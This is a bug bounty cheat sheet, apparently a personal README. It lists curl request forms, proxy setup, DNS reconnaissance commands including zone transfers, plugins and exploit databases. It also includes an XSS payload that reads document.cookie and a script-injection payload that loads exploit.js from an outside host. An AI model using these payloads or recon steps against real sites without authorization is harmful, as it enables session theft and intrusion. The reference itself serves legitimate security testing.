# Bug Bounty

Overview
---------
1. - [Web Requests](#1---web-requests)
2. - [Web Proxies](#2---web-proxies)
3. - [Online Resources](#3---online-resources)
4. - [Browser Plugins](#4---browser-plugins)
5. - [Web Reconnaissance](#5---web-reconnaissance)
6. - [Sensitive Data Exposure](#6---sensitive-data-exposure)
7. - [HTML Injection](#7---html-injection)
8. - [Cross-Site Scripting (XSS)](#8---cross-site-scripting-xss)
9. - [Cross-Site Request Forgery (CSRF)](#9---cross-site-request-forgery-csrf)
10. - [Exploit Research](#10---exploit-research)

   
#1. - Web Requests
-----------------------------------------

- Curl

```
$ curl -v <URL>
$ curl -I <URL>
$ curl -i <URL>
$ curl -v -X OPTIONS <URL>
$ curl -u admin:admin <URL>
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' <URL>
$ curl <URL>/search.php?search=test
$ curl -X POST -d 'username=admin&password=admin' <URL>
$ curl -X POST -d '{"search":"test"}' -H 'Content-Type: application/json' <URL>
$ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
$ curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
```

- DevTools

```
F12
```

#2. - Web Proxies
-----------------------------------------

- Burp Suite

```
Proxy -> Intercept -> Open Browser
OR
Settings -> Network Settings -> Settings -> Select Manual proxy configuration -> Enter IP address and port of our proxy -> Select Use this proxy server for all protocols 
```

- ZAP Proxy

```
Firefox Icon
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

#3. - Online Resources
-----------------------------------------

- OWASP Web Security Testing Guide

```
https://owasp.org/www-project-web-security-testing-guide/
https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing
```

- HTML - CSS - JS Online Editor

```
https://html-css-js.com/
```

- HTML WYSIWYG Online Editor

```
https://htmlg.com/html-editor/
```

- JSFiddle Code Playground

```
https://jsfiddle.net/
```

#4. - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```

- FoxyProxy: proxy management

```
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
```

#5. - Web Reconnaissance
-----------------------------------------

- Whois

```
$ whois <Domain Name>
https://whoisfreaks.com/
```

- DNS

```
Edit /etc/hosts OR C:\Windows\System32\drivers\etc\hosts
$ dig <Domain Name>
$ dig <Domain Name> NS
$ dig <Domain Name> MS
$ dig @1.1.1.1 <Domain Name>
$ dig +trace <Domain Name>
$ dig -x <IP address>
$ dig +short <Domain Name>
$ dig <Domain Name> ANY
C:\> nslookup
$ host <IP address/Domain Name>
$ host -t ns <Domain Name>
$ host -t mx <Domain Name>
$ host -t txt <Domain Name>
$ host -l <Domain Name> <DNS server name/IP address>
$ dnsenum <Domain Name>
$ dnsrecon -d <Domain Name> -t axfr
$ fierce
$ theHarvester -d <Domain Name> -b google > google.txt
$ amass
$ assetfinder
$ puredns
```

#6. - Sensitive Data Exposure
-----------------------------------------

- Source Code

```
Right-click -> View page source
OR
CTRL + U
```

#7. - HTML Injection
-----------------------------------------

- Hyperlink

```
<a href="http://www.google.com">Click Me</a>
```

#8. - Cross-Site Scripting (XSS)
-----------------------------------------

*Reflected XSS	= Occurs when user input is displayed on the page after processing (e.g., search result or error message).*

*Stored XSS = Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).*

*DOM XSS	= Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).*

- DOM XSS

```
#"><img src=/ onerror=alert(document.cookie)>
```

#9. - Cross-Site Request Forgery (CSRF)
-----------------------------------------

- Password Change

```
"><script src=//www.example.com/exploit.js></script>
```

#10. - Exploit Research
-----------------------------------------

- CVEdetails

```
https://www.cvedetails.com/
```

- Exploit DB

```
https://www.exploit-db.com/
```

- Vulners

```
https://vulners.com/
```

- Rapid7

```
https://www.rapid7.com/db/
```

- Vulnerability Lab

```
https://www.vulnerability-lab.com/
```

- Packet Storm Security

```
https://packetstormsecurity.com/
```
